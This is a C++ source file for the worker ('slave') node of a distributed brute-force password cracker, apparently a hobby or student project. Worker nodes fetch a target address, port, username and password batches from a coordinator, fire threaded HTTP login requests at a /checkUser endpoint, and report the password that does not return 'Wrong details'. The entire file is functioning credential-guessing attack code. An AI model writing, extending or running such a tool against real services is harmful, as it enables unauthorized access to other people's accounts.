
///Users/stratosntallaris/Library/Developer/Xcode/DerivedData/Socketio-dcbiwjottlzfwwecygndwpnbgvyg/Build/Products/Release
#include "slave.hpp"

slave::slave(std::string bruteforceUrl, unsigned int short port, std::string username, std::string coOrdinatorIp, unsigned int short coOrdinatorPort){
    this->bruteforceUrl = bruteforceUrl;
    this->username = username;
    this->port = port;
    this->coOrdinatorIp = coOrdinatorIp;
    this->coOrdinatorPort = coOrdinatorPort;
    
}

slave::slave(std::string bruteforceUrl, unsigned int short port, std::string username, std::vector<std::string> passwords){
    this->bruteforceUrl = bruteforceUrl;
    this->username = username;
    this->passwords = passwords;
    this->port = port;
}

slave::slave(std::string coOrdinatorIp, unsigned int short coOrdinatorPort){
    this->coOrdinatorIp = coOrdinatorIp;
    this->coOrdinatorPort = coOrdinatorPort;
}



void slave::startThreads(){
    int totalruns;
    int i;
    if(passwords.size() % threadNumber == 0 ){
        totalruns = passwords.size()/threadNumber;
    }else{
        totalruns = (passwords.size()/threadNumber)+1;
    }
    for(int j = 0 ; j<totalruns; j++){
        for( i =0 ; i<threadNumber; i++){
            if(passwords.size()!=0 && !correctPassword){
                tryPasswordThreads[i] = std::thread(&slave::tryPassword,this,passwords[0]);
                passwords.erase(passwords.begin());
            }else{
                break;
            }
        }
        for(int l=0 ; l<i; l++){
            tryPasswordThreads[l].join();
        }
        
    }
}
void slave::tryPassword(std::string password) {
//    std::cout << "Thread started" << std::endl;
    char buffer[3000];
    char recvBuffer[3000];
    int sock;
    struct sockaddr_in server;
    //Create socket
    sock = socket(AF_INET , SOCK_STREAM , 0);
    if (sock == -1){
        printf("Socket Failed!");
    }
    
    server.sin_addr.s_addr = inet_addr(bruteforceUrl.c_str());
    server.sin_family = AF_INET;
    server.sin_port = htons( port );
    
    //Connect to remote server
    if (connect(sock , (struct sockaddr *)&server , sizeof(server)) < 0){
        puts("\nConnect Failed!\n");
        
    }
    
    sprintf(buffer, "GET /checkUser/username=%s&password=%s HTTP/1.1\r\nHost: %s \r\nConnection: close\r\n\r\n", username.c_str(), password.c_str(),bruteforceUrl.c_str());
    tryPasswordLock.lock();
    send(sock, buffer , sizeof(buffer), 0);
    usleep(1000);
    recv(sock, recvBuffer, sizeof(recvBuffer), 0);
    tryPasswordLock.unlock();
    std::string recvBuffer_converted(recvBuffer, sizeof(recvBuffer));
//    std::cout << recvBuffer_converted << std::endl;
    if(recvBuffer_converted.find("Wrong details") != std::string::npos){
//        std::cout << "Wrong Password!"<< std::endl;
    }else{
        //when implementing co-ordinator don't forget to update the server that you found the password so the rest of the slaves can stop.
        std::cout << "Correct Password!" << std::endl;
        correctPassword = true;
        socketLock.lock();
        struct networkPacket sendPacket;
        sendPacket.packetType = PASSWORD_FOUND;
        sendPacket.passwords[0] = password;
        send(coordinatorSock, &sendPacket, sizeof(struct networkPacket), 0 );
        socketLock.unlock();
    }
    close(sock);
}

void slave::getPasswordsFromCoordinator(std::string coOrdinatorIp, unsigned short int coOrdinatorPort){
    struct sockaddr_in server;
    int sock;
    struct networkPacket sendPacket;
    struct networkPacket recvPacket;
    
    sock = socket(AF_INET , SOCK_STREAM , 0);
    if (sock == -1){
        printf("Socket Failed!");
    }
    puts("Socket Success!");
    server.sin_addr.s_addr = inet_addr(coOrdinatorIp.c_str());
    server.sin_family = AF_INET;
    server.sin_port = htons( coOrdinatorPort );
    if (connect(sock , (struct sockaddr *)&server , sizeof(server)) < 0){
        puts("\nConnect Failed!\n");
    }
    puts("\nConnect Success\n");
    coordinatorSock = sock;
    sendPacket.packetType = SLAVE_CONNECTED;
    socketLock.lock();
    send(sock, &sendPacket , sizeof(struct networkPacket), 0);
    socketLock.unlock();
    sendPacket.packetType = ASK_FOR_BRUTEFORCE_INFO;
    socketLock.lock();
    send(sock, &sendPacket , sizeof(struct networkPacket), 0);
    socketLock.unlock();
    
//    sendPacket.packetType = ASK_FOR_PASSWORDS;
//    socketLock.lock();
//    send(sock, &sendPacket, sizeof(sendPacket), 0);
//    socketLock.unlock();

    while( recv(sock , &recvPacket , sizeof(struct networkPacket) , MSG_WAITALL) > 0 ){
        messageReceived(recvPacket, sock);
    }
}

void slave::startPasswordConn(){
    std::thread t(&slave::getPasswordsFromCoordinator, this, this->coOrdinatorIp, this->coOrdinatorPort);
    t.join();
    
}

void slave::messageReceived(struct networkPacket receivedPacket, int sock){
    struct networkPacket sendPacket;
    int convert_into_16;
    switch (receivedPacket.packetType) {
        case COORDINATOR_SENT_PASSWORDS:
            passwordsLock.lock();
            for(int i=0; i<packetPasswords; i++){
                passwords.push_back(receivedPacket.passwords[i]);
            }
            passwordsLock.unlock();
            std::cout << "Received and trying passwords" << std::endl;
            this->startThreads();
            sendPacket.packetType = ASK_FOR_PASSWORDS;
            socketLock.lock();
            send(sock, &sendPacket, sizeof(sendPacket), 0);
            socketLock.unlock();
            break;
        case PASSWORD_FOUND:
            correctPassword=true;
            passwordsLock.lock();
            passwords.clear();
            passwordsLock.unlock();
            std::cout << "Password Found!" << std::endl;
            break;
        case RECEIVE_BRUTEFORCE_INFO:
            std::cout << "Received Brute Force Info" << std::endl;
            this->bruteforceUrl = receivedPacket.restInfo.substr(0, receivedPacket.restInfo.find(","));
            receivedPacket.restInfo = receivedPacket.restInfo.substr(bruteforceUrl.size()+1, receivedPacket.restInfo.size() - bruteforceUrl.size()+1);
            convert_into_16 = std::stoi(receivedPacket.restInfo.substr(0, receivedPacket.restInfo.find(",")));
            this->port = convert_into_16 & 0xFFFFFFFF;
            this->username = receivedPacket.restInfo.substr(receivedPacket.restInfo.find(",")+1,receivedPacket.restInfo.size());
            std::cout << "Asking for passwords" << std::endl;
            sendPacket.packetType = ASK_FOR_PASSWORDS;
            socketLock.lock();
            send(sock, &sendPacket, sizeof(sendPacket), 0);
            socketLock.unlock();
            break;
        case BRUTEFORCE_INFO_NOT_AVAILABLE:
            std::cout << "Bruteforce info has no yet been provided by the client" << std::endl;
            sleep(20);
            sendPacket.packetType = ASK_FOR_BRUTEFORCE_INFO;
            socketLock.lock();
            send(sock, &sendPacket, sizeof(sendPacket), 0);
            socketLock.unlock();
            break;
        case NO_MORE_PASSWORDS_FROM_COORDINATOR:
            std::cout << "No more passwords from Coordinator" << std::endl;
            sleep(1);
            std::cout << "Trying to get password from coordinator " << std::endl;
            sendPacket.packetType = ASK_FOR_PASSWORDS;
            socketLock.lock();
            send(sock, &sendPacket, sizeof(sendPacket), 0);
            socketLock.unlock();
            break;

    }
}


